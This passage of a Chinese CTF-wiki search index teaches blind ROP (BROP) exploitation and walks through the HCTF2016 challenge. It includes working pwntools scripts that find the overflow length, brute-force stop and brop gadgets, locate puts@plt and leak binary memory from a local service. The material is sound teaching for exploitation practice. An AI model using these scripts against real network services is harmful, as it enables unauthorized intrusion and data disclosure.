\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5e03\u7f6e\u4e86 stop gadget \uff0c\u90a3\u4e48\u5bf9\u4e8e\u6211\u4eec\u6240\u8981\u5c1d\u8bd5\u7684\u6bcf\u4e00\u4e2a\u5730\u5740\uff0c\u5982\u679c\u5b83\u662f\u4e00\u4e2agadget\u7684\u8bdd\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\u3002\u63a5\u4e0b\u6765\uff0c\u5c31\u662f\u53bb\u60f3\u529e\u6cd5\u8bc6\u522b\u8fd9\u4e9bgadget\u3002", 
            "title": "\u5bfb\u627estop gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#gadgets_1", 
            "text": "\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u8bc6\u522b\u8fd9\u4e9bgadgets\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6808\u5e03\u5c40\u4ee5\u53ca\u7a0b\u5e8f\u7684\u884c\u4e3a\u6765\u8fdb\u884c\u8bc6\u522b\u3002\u4e3a\u4e86\u66f4\u52a0\u5bb9\u6613\u5730\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u5b9a\u4e49\u6808\u4e0a\u7684\u4e09\u79cd\u5730\u5740   Probe  \u63a2\u9488\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u60f3\u8981\u63a2\u6d4b\u7684\u4ee3\u7801\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u90fd\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece0x400000\u5c1d\u8bd5\uff0c\u5982\u679c\u4e0d\u6210\u529f\uff0c\u6709\u53ef\u80fd\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u518d\u4e0d\u6d4e\uff0c\u5c31\u53ef\u80fd\u662f\u7a0b\u5e8f\u662f32\u4f4d\u4e86\u3002\u3002\u8fd9\u91cc\u6211\u8fd8\u6ca1\u6709\u7279\u522b\u60f3\u660e\u767d\uff0c\u600e\u4e48\u53ef\u4ee5\u5feb\u901f\u786e\u5b9a\u8fdc\u7a0b\u7684\u4f4d\u6570\u3002    Stop  \u4e0d\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684stop gadget\u7684\u5730\u5740\u3002    Trap  \u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\u7684\u5730\u5740     \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u6808\u4e0a\u6446\u653e\u4e0d\u540c\u987a\u5e8f\u7684 Stop \u4e0e  Trap \u4ece\u800c\u6765\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684\u6307\u4ee4\u3002\u56e0\u4e3a\u6267\u884cStop\u610f\u5473\u7740\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\uff0c\u6267\u884cTrap\u610f\u5473\u7740\u7a0b\u5e8f\u4f1a\u7acb\u5373\u5d29\u6e83\u3002\u8fd9\u91cc\u7ed9\u51fa\u51e0\u4e2a\u4f8b\u5b50   probe,stop,traps(traps,traps,...)  \u6211\u4eec\u901a\u8fc7\u7a0b\u5e8f\u5d29\u6e83\u4e0e\u5426( \u5982\u679c\u7a0b\u5e8f\u5728probe\u5904\u76f4\u63a5\u5d29\u6e83\u600e\u4e48\u5224\u65ad )\u53ef\u4ee5\u627e\u5230\u4e0d\u4f1a\u5bf9\u6808\u8fdb\u884cpop\u64cd\u4f5c\u7684gadget\uff0c\u5982  ret  xor eax,eax; ret      probe,trap,stop,traps  \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u627e\u5230\u53ea\u662f\u5f39\u51fa\u4e00\u4e2a\u6808\u53d8\u91cf\u7684gadget\u3002\u5982  pop rax; ret  pop rdi; ret      probe, trap, trap, trap, trap, trap, trap, stop, traps  \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u6765\u627e\u5230\u5f39\u51fa6\u4e2a\u6808\u53d8\u91cf\u7684gadget\uff0c\u4e5f\u5c31\u662f\u4e0ebrop gadget\u76f8\u4f3c\u7684gadget\u3002 \u8fd9\u91cc\u611f\u89c9\u539f\u6587\u662f\u6709\u95ee\u9898\u7684\uff0c\u6bd4\u5982\u8bf4\u5982\u679c\u9047\u5230\u4e86\u53ea\u662fpop\u4e00\u4e2a\u6808\u53d8\u91cf\u7684\u5730\u5740\uff0c\u5176\u5b9e\u4e5f\u662f\u4e0d\u4f1a\u5d29\u6e83\u7684\uff0c\uff0c \u8fd9\u91cc\u4e00\u822c\u6765\u8bf4\u4f1a\u9047\u5230\u4e24\u5904\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5730\u65b9  plt\u5904\u4e0d\u4f1a\u5d29\uff0c\uff0c  _start\u5904\u4e0d\u4f1a\u5d29\uff0c\u76f8\u5f53\u4e8e\u7a0b\u5e8f\u91cd\u65b0\u6267\u884c\u3002       \u4e4b\u6240\u4ee5\u8981\u5728\u6bcf\u4e2a\u5e03\u5c40\u7684\u540e\u9762\u90fd\u653e\u4e0atrap\uff0c\u662f\u4e3a\u4e86\u80fd\u591f\u8bc6\u522b\u51fa\uff0c\u5f53\u6211\u4eec\u7684probe\u5904\u5bf9\u5e94\u7684\u5730\u5740\u6267\u884c\u7684\u6307\u4ee4\u8df3\u8fc7\u4e86stop\uff0c\u7a0b\u5e8f\u7acb\u9a6c\u5d29\u6e83\u7684\u884c\u4e3a\u3002  \u4f46\u662f\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u6211\u4eec\u4ecd\u7136\u96be\u4ee5\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684gadget\u5230\u5e95\u662f\u5728\u5bf9\u54ea\u4e2a\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u3002  \u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u5411BROP\u8fd9\u6837\u7684\u4e00\u4e0b\u5b50\u5f39\u51fa6\u4e2a\u5bc4\u5b58\u5668\u7684gadgets\uff0c\u7a0b\u5e8f\u4e2d\u5e76\u4e0d\u7ecf\u5e38\u51fa\u73b0\u3002\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u8fd9\u6837\u7684gadgets\uff0c\u90a3\u4e48\uff0c\u6709\u5f88\u5927\u7684\u53ef\u80fd\u6027\uff0c\u8fd9\u4e2agadgets\u5c31\u662fbrop gadgets\u3002\u6b64\u5916\uff0c\u8fd9\u4e2agadgets\u901a\u8fc7\u9519\u4f4d\u8fd8\u53ef\u4ee5\u751f\u6210pop rsp\u7b49\u8fd9\u6837\u7684gadgets\uff0c\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u8bc6\u522b\u8fd9\u4e2agadgets\u7684\u6807\u5fd7\u3002  \u6b64\u5916\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5b66\u7684ret2libc_csu_init\u53ef\u4ee5\u77e5\u9053\u8be5\u5730\u5740\u51cf\u53bb0x1a\u5c31\u4f1a\u5f97\u5230\u5176\u4e0a\u4e00\u4e2agadgets\u3002\u53ef\u4ee5\u4f9b\u6211\u4eec\u8c03\u7528\u5176\u5b83\u51fd\u6570\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662fprobe\u53ef\u80fd\u662f\u4e00\u4e2astop gadget\uff0c\u6211\u4eec\u5f97\u53bb\u68c0\u67e5\u4e00\u4e0b\uff0c\u600e\u4e48\u68c0\u67e5\u5462\uff1f\u6211\u4eec\u53ea\u9700\u8981\u8ba9\u540e\u9762\u6240\u6709\u7684\u5185\u5bb9\u53d8\u4e3atrap\u5730\u5740\u5373\u53ef\u3002\u56e0\u4e3a\u5982\u679c\u662fstop gadget\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u5c31\u4f1a\u5d29\u6e83\u3002\u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6709\u610f\u601d.", 
            "title": "\u8bc6\u522b gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#plt", 
            "text": "\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u7a0b\u5e8f\u7684plt\u8868\u5177\u6709\u6bd4\u8f83\u89c4\u6574\u7684\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2aplt\u8868\u9879\u90fd\u662f16\u5b57\u8282\u3002\u800c\u4e14\uff0c\u5728\u6bcf\u4e00\u4e2a\u8868\u9879\u76846\u5b57\u8282\u504f\u79fb\u5904\uff0c\u662f\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u89e3\u6790\u8def\u5f84\uff0c\u5373\u7a0b\u5e8f\u6700\u521d\u6267\u884c\u8be5\u51fd\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u6267\u884c\u8be5\u8def\u5f84\u5bf9\u51fd\u6570\u7684got\u5730\u5740\u8fdb\u884c\u89e3\u6790\u3002    \u6b64\u5916\uff0c\u5bf9\u4e8e\u5927\u591a\u6570plt\u8c03\u7528\u6765\u8bf4\uff0c\u4e00\u822c\u90fd\u4e0d\u5bb9\u6613\u5d29\u6e83\uff0c\u5373\u4f7f\u662f\u4f7f\u7528\u4e86\u6bd4\u8f83\u5947\u602a\u7684\u53c2\u6570\u3002\u6240\u4ee5\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u7cfb\u5217\u7684\u957f\u5ea6\u4e3a16\u7684\u6ca1\u6709\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684\u4ee3\u7801\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4e00\u5b9a\u7684\u7406\u7531\u76f8\u4fe1\u6211\u4eec\u9047\u5230\u4e86plt\u8868\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u524d\u540e\u504f\u79fb6\u5b57\u8282\uff0c\u6765\u5224\u65ad\u6211\u4eec\u662f\u5904\u4e8eplt\u8868\u9879\u4e2d\u95f4\u8fd8\u662f\u8bf4\u5904\u4e8e\u5f00\u5934\u3002", 
            "title": "\u5bfb\u627ePLT"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#rdx", 
            "text": "\u5f53\u6211\u4eec\u627e\u5230plt\u8868\u4e4b\u540e\uff0c\u4e0b\u9762\uff0c\u6211\u4eec\u5c31\u8be5\u60f3\u529e\u6cd5\u6765\u63a7\u5236rdx\u7684\u6570\u503c\u4e86\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u786e\u8ba4strcmp\u7684\u4f4d\u7f6e\u5462\uff1f\u9700\u8981\u63d0\u524d\u8bf4\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528strcmp\u51fd\u6570\uff0c\u6240\u4ee5\u5728\u6ca1\u6709\u8c03\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c31\u5f97\u5229\u7528\u5176\u5b83\u65b9\u5f0f\u6765\u63a7\u5236rdx\u7684\u503c\u4e86\u3002\u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u4e2d\u4f7f\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u3002  \u4e4b\u524d\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop\u7684gadgets\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u51fd\u6570\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u4e86\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u4ee5\u4e0b\u4e24\u79cd\u5730\u5740   readable\uff0c\u53ef\u8bfb\u7684\u5730\u5740\u3002  bad, \u975e\u6cd5\u5730\u5740\uff0c\u4e0d\u53ef\u8bbf\u95ee\uff0c\u6bd4\u5982\u8bf40x0\u3002   \u90a3\u4e48\u6211\u4eec\u5982\u679c\u63a7\u5236\u4f20\u9012\u7684\u53c2\u6570\u4e3a\u8fd9\u4e24\u79cd\u5730\u5740\u7684\u7ec4\u5408\uff0c\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u56db\u79cd\u60c5\u51b5   strcmp(bad,bad)  strcmp(bad,readable)  strcmp(readable,bad)  strcmp(readable,readable)   \u53ea\u6709\u6700\u540e\u4e00\u79cd\u683c\u5f0f\uff0c\u7a0b\u5e8f\u624d\u4f1a\u6b63\u5e38\u6267\u884c\u3002  \u6ce8 \uff1a\u5728\u6ca1\u6709PIE\u4fdd\u62a4\u7684\u65f6\u5019\uff0c64\u4f4d\u7a0b\u5e8f\u7684ELF\u6587\u4ef6\u76840x400000\u5904\u67097\u4e2a\u975e\u96f6\u5b57\u8282\u3002  \u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u5177\u4f53\u5730\u53bb\u505a\u5462\uff1f\u6709\u4e00\u79cd\u6bd4\u8f83\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u4ece\u5934\u5230\u5c3e\u4f9d\u6b21\u626b\u63cf\u6bcf\u4e2aplt\u8868\u9879\uff0c\u4f46\u662f\u8fd9\u4e2a\u5374\u6bd4\u8f83\u9ebb\u70e6\u3002\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u5982\u4e0b\u7684\u4e00\u79cd\u65b9\u6cd5   \u5229\u7528plt\u8868\u9879\u7684\u6162\u8def\u5f84  \u5e76\u4e14\u5229\u7528\u4e0b\u4e00\u4e2a\u8868\u9879\u7684\u6162\u8def\u5f84\u7684\u5730\u5740\u6765\u8986\u76d6\u8fd4\u56de\u5730\u5740   \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u4e0d\u7528\u6765\u56de\u63a7\u5236\u76f8\u5e94\u7684\u53d8\u91cf\u4e86\u3002   \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u80fd\u78b0\u5de7\u627e\u5230strncmp\u6216\u8005strcasecmp\u51fd\u6570\uff0c\u5b83\u4eec\u5177\u6709\u548cstrcmp\u4e00\u6837\u7684\u6548\u679c\u3002", 
            "title": "\u63a7\u5236rdx"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_13", 
            "text": "\u5bfb\u627e\u8f93\u51fa\u51fd\u6570\u65e2\u53ef\u4ee5\u5bfb\u627ewrite\uff0c\u4e5f\u53ef\u4ee5\u5bfb\u627eputs\u3002\u4e00\u822c\u73b0\u5148\u627eputs\u51fd\u6570\u3002\u4e0d\u8fc7\u8fd9\u91cc\u4e3a\u4e86\u4ecb\u7ecd\u65b9\u4fbf\uff0c\u5148\u4ecb\u7ecd\u5982\u4f55\u5bfb\u627ewrite\u3002", 
            "title": "\u5bfb\u627e\u8f93\u51fa\u51fd\u6570"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#writeplt", 
            "text": "\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236write\u51fd\u6570\u7684\u4e09\u4e2a\u53c2\u6570\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u518d\u6b21\u904d\u5386\u6240\u6709\u7684plt\u8868\uff0c\u6839\u636ewrite\u51fd\u6570\u5c06\u4f1a\u8f93\u51fa\u5185\u5bb9\u6765\u627e\u5230\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6709\u4e2a\u6bd4\u8f83\u9ebb\u70e6\u7684\u5730\u65b9\u5728\u4e8e\u6211\u4eec\u9700\u8981\u627e\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u627e\u5230\u8fd9\u4e2a\u503c   \u4f7f\u7528rop chain\uff0c\u540c\u65f6\u4f7f\u5f97\u6bcf\u4e2arop\u5bf9\u5e94\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e0d\u4e00\u6837  \u540c\u65f6\u6253\u5f00\u591a\u4e2a\u8fde\u63a5\uff0c\u5e76\u4e14\u6211\u4eec\u4f7f\u7528\u76f8\u5bf9\u8f83\u9ad8\u7684\u6570\u503c\u6765\u8bd5\u4e00\u8bd5\u3002   \u9700\u8981\u6ce8\u610f\u7684\u662f   linux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002  posix\u6807\u51c6\u6bcf\u6b21\u7533\u8bf7\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6570\u503c\u603b\u662f\u5f53\u524d\u6700\u5c0f\u53ef\u7528\u6570\u503c\u3002   \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u5bfb\u627eputs\u51fd\u6570\u3002", 
            "title": "\u5bfb\u627ewrite@plt"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#putsplt", 
            "text": "\u5bfb\u627eputs\u51fd\u6570(\u8fd9\u91cc\u6211\u4eec\u5bfb\u627e\u7684\u662f plt)\uff0c\u6211\u4eec\u81ea\u7136\u9700\u8981\u63a7\u5236rdi\u53c2\u6570\uff0c\u5728\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop gadget\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u6839\u636ebrop gadget\u504f\u79fb9\u53ef\u4ee5\u5f97\u5230\u76f8\u5e94\u7684gadgets\uff08\u7531ret2libc_csu_init\u4e2d\u540e\u7eed\u53ef\u5f97\uff09\u3002\u540c\u65f6\u5728\u7a0b\u5e8f\u8fd8\u6ca1\u6709\u5f00\u542fPIE\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\uff0c0x400000\u5904\u4e3aELF\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u5176\u5185\u5bb9\u4e3a\\x7fELF\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u8fdb\u884c\u5224\u65ad\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5176payload\u5982\u4e0b  payload =  A *length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)", 
            "title": "\u5bfb\u627eputs@plt"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_14", 
            "text": "\u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5df2\u7ecf\u53ef\u4ee5\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f93\u51fa.text\u6bb5\u66f4\u591a\u7684\u5185\u5bb9\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u5408\u9002gadgets\u3002\u540c\u65f6\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u5176\u5b83\u51fd\u6570\uff0c\u5982dup2\u6216\u8005execve\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u653b\u51fb\u8005\u6b64\u65f6\u4f1a\u53bb\u505a\u4e0b\u4e8b\u60c5   \u5c06socket\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u8f93\u5165\u8f93\u51fa  \u5bfb\u627e\u201c/bin/sh\u201d\u7684\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6700\u597d\u662f\u627e\u5230\u4e00\u5757\u53ef\u5199\u7684\u5185\u5b58\uff0c\u5229\u7528write\u51fd\u6570\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5199\u5230\u76f8\u5e94\u7684\u5730\u5740\u3002  \u6267\u884cexecve\u83b7\u53d6shell\uff0c\u83b7\u53d6execve\u4e0d\u4e00\u5b9a\u5728plt\u8868\u4e2d\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u5c31\u9700\u8981\u60f3\u529e\u6cd5\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u4e86\u3002", 
            "title": "\u653b\u51fb\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_15", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5HCTF2016\u7684\u51fa\u9898\u4eba\u5931\u8e2a\u4e86\u4e3a\u4f8b\uff0c\u76f8\u5173\u7684\u90e8\u7f72\u6587\u4ef6\u90fd\u653e\u5728\u4e86example\u6587\u4ef6\u5939\u4e0b\u7684\u5bf9\u5e94\u76ee\u5f55\u4e0b\u3002\u57fa\u672c\u601d\u8def\u5982\u4e0b", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_16", 
            "text": "def   getbufferflow_length (): \n     i   =   1 \n     while   1 : \n         try : \n             sh   =   remote ( 127.0.0.1 ,   9999 ) \n             sh . recvuntil ( WelCome my friend,Do you know password? \\n ) \n             sh . send ( i   *   a ) \n             output   =   sh . recv () \n             sh . close () \n             if   not   output . startswith ( No password ): \n                 return   i   -   1 \n             else : \n                 i   +=   1 \n         except   EOFError : \n             sh . close () \n             return   i   -   1   \u6839\u636e\u4e0a\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u6808\u6ea2\u51fa\u7684\u957f\u5ea6\u4e3a72\u3002\u540c\u65f6\uff0c\u6839\u636e\u56de\u663e\u4fe1\u606f\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u5f00\u542fcanary\u4fdd\u62a4\uff0c\u5426\u5219\uff0c\u5c31\u4f1a\u6709\u76f8\u5e94\u7684\u62a5\u9519\u5185\u5bb9\u3002\u6240\u4ee5\u6211\u4eec\u4e0d\u9700\u8981\u6267\u884cstack reading\u3002", 
            "title": "\u786e\u5b9a\u6808\u6ea2\u51fa\u957f\u5ea6"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#stop-gadgets_1", 
            "text": "\u5bfb\u627e\u8fc7\u7a0b\u5982\u4e0b  def   get_stop_addr ( length ): \n     addr   =   0x400000 \n     while   1 : \n         try : \n             sh   =   remote ( 127.0.0.1 ,   9999 ) \n             sh . recvuntil ( password? \\n ) \n             payload   =   a   *   length   +   p64 ( addr ) \n             sh . sendline ( payload ) \n             sh . recv () \n             sh . close () \n             print   one success addr: 0x %x   %   ( addr ) \n             return   addr \n         except   Exception : \n             addr   +=   1 \n             sh . close ()   \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c1d\u8bd564\u4f4d\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542fPIE\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u4e00\u822c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684\uff0c\uff0c\uff0c\u5982\u679c\u5f00\u542f\u4e86\uff0c\uff0c\u90a3\u5c31\u6309\u7167\u5f00\u542f\u4e86\u7684\u65b9\u6cd5\u505a\uff0c\uff0c\u7ed3\u679c\u53d1\u73b0\u4e86\u4e0d\u5c11\uff0c\uff0c\u6211\u9009\u62e9\u4e86\u4e00\u4e2a\u8c8c\u4f3c\u8fd4\u56de\u5230\u6e90\u7a0b\u5e8f\u4e2d\u7684\u5730\u5740  one success stop gadget addr: 0x4006b6", 
            "title": "\u5bfb\u627e stop gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#brop-gadgets_1", 
            "text": "\u4e0b\u9762\uff0c\u6211\u4eec\u6839\u636e\u4e0a\u9762\u4ecb\u7ecd\u7684\u539f\u7406\u6765\u5f97\u5230\u5bf9\u5e94\u7684brop gadgets\u5730\u5740\u3002\u6784\u9020\u5982\u4e0b\uff0cget_brop_gadget\u662f\u4e3a\u4e86\u5f97\u5230\u53ef\u80fd\u7684brop gadget\uff0c\u540e\u9762\u7684check_brop_gadget\u662f\u4e3a\u4e86\u68c0\u67e5\u3002  def   get_brop_gadget ( length ,   stop_gadget ,   addr ): \n     try : \n         sh   =   remote ( 127.0.0.1 ,   9999 ) \n         sh . recvuntil ( password? \\n ) \n         payload   =   a   *   length   +   p64 ( addr )   +   p64 ( 0 )   *   6   +   p64 ( \n             stop_gadget )   +   p64 ( 0 )   *   10 \n         sh . sendline ( payload ) \n         content   =   sh . recv () \n         sh . close () \n         print   content \n         # stop gadget returns memory \n         if   not   content . startswith ( WelCome ): \n             return   False \n         return   True \n     except   Exception : \n         sh . close () \n         return   False  def   check_brop_gadget ( length ,   addr ): \n     try : \n         sh   =   remote ( 127.0.0.1 ,   9999 ) \n         sh . recvuntil ( password? \\n ) \n         payload   =   a   *   length   +   p64 ( addr )   +   a   *   8   *   10 \n         sh . sendline ( payload ) \n         content   =   sh . recv () \n         sh . close () \n         return   False \n     except   Exception : \n         sh . close () \n         return   True  ##length = getbufferflow_length()  length   =   72  ##get_stop_addr(length)  stop_gadget   =   0x4006b6  addr   =   0x400740  while   1 : \n     print   hex ( addr ) \n     if   get_brop_gadget ( length ,   stop_gadget ,   addr ): \n         print   possible brop gadget: 0x %x   %   addr \n         if   check_brop_gadget ( length ,   addr ): \n             print   success brop gadget: 0x %x   %   addr \n             break \n     addr   +=   1   \u8fd9\u6837\uff0c\u6211\u4eec\u57fa\u672c\u5f97\u5230\u4e86brop\u7684gadgets\u5730\u57400x4007ba", 
            "title": "\u8bc6\u522bbrop gadgets"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#putsplt_1", 
            "text": "\u6839\u636e\u4e0a\u9762\uff0c\u6240\u8bf4\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0bpayload\u6765\u8fdb\u884c\u83b7\u53d6  payload =  A *72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)  \u5177\u4f53\u51fd\u6570\u5982\u4e0b  def   get_puts_addr ( length ,   rdi_ret ,   stop_gadget ): \n     addr   =   0x400000 \n     while   1 : \n         print   hex ( addr ) \n         sh   =   remote ( 127.0.0.1 ,   9999 ) \n         sh . recvuntil ( password? \\n ) \n         payload   =   A   *   length   +   p64 ( rdi_ret )   +   p64 ( 0x400000 )   +   p64 ( \n             addr )   +   p64 ( stop_gadget ) \n         sh . sendline ( payload ) \n         try : \n             content   =   sh . recv () \n             if   content . startswith ( \\x7f ELF ): \n                 print   find puts@plt addr: 0x %x   %   addr \n                 return   addr \n             sh . close () \n             addr   +=   1 \n         except   Exception : \n             sh . close () \n             addr   +=   1   \u6700\u540e\u6839\u636eplt\u7684\u7ed3\u6784\uff0c\u9009\u62e90x400560\u4f5c\u4e3aputs@plt", 
            "title": "\u786e\u5b9aputs@plt\u5730\u5740"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#putsgot", 
            "text": "\u5728\u6211\u4eec\u53ef\u4ee5\u8c03\u7528puts\u51fd\u6570\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732puts\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\uff0c\u4ece\u800c\u83b7\u53d6\u76f8\u5173\u7684system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5730\u5740\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\u6211\u4eec\u4ece0x400000\u5f00\u59cb\u6cc4\u97320x1000\u4e2a\u5b57\u8282\uff0c\u8fd9\u5df2\u7ecf\u8db3\u591f\u5305\u542b\u7a0b\u5e8f\u7684plt\u90e8\u5206\u4e86\u3002\u4ee3\u7801\u5982\u4e0b  def   leak ( length ,   rdi_ret ,   puts_plt ,   leak_addr ,   stop_gadget ): \n     sh   =   remote ( 127.0.0.1 ,   9999 ) \n     payload   =   a   *   length   +   p64 ( rdi_ret )   +   p64 ( leak_addr )   +   p64 ( \n         puts_plt )   +   p64 ( stop_gadget ) \n     sh . recvuntil ( password? \\n ) \n     sh . sendline ( payload ) \n     try : \n         data   =   sh . recv () \n         sh . close () \n         try : \n             data   =   data [: data . index ( \\n WelCome )] \n         except   Exception : \n             data   =   data \n         if   data   ==   : \n             data   =   \\x00 \n         return   data \n     except   Exception : \n         sh . close () \n         return   None  ##length = getbufferflow_length()  length   =   72  ##stop_gadget = get_stop_addr(length)  stop_gadget   =   0x4006b6  ##brop_gadget = find_brop_gadget(length,stop_gadget)  brop_gadget   =   0x4007ba  rdi_ret   =   brop_gadget   +   9  ##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)  puts_plt   =   0x400560  addr   =   0x400000  result   =    while   addr     0x401000 : \n     print   hex ( addr ) \n     data   =   leak ( length ,   rdi_ret ,   puts_plt ,   addr ,   stop_gadget ) \n     if   data   is   None : \n         continue \n     else : \n         result   +=   data \n     addr   +=   len ( data )  with   open ( code ,   wb )   as   f : \n     f . write ( result )   